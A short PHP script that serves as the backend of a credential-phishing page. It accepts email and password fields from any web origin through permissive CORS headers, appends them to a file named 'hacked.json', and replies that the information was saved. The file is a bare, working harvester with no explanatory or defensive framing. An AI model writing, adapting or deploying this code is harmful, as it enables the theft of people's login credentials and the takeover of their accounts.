<?php

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: OPTIONS,GET,POST,PUT,DELETE");
header(
    "Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With"
);

/*

*/
$email = $_POST["email"];
$password = $_POST["password"];
$make_data = json_encode([
    "email" => $email,
    "password" => $password
], JSON_PRETTY_PRINT);

$myfile = fopen("hacked.json", "a") or die("Unable to open file!");

if (fwrite($myfile, $make_data)) {
    echo json_encode([
        "status" => 10100,
        "message" => "Informations Saved"
    ]);
    fclose($myfile);
}

?>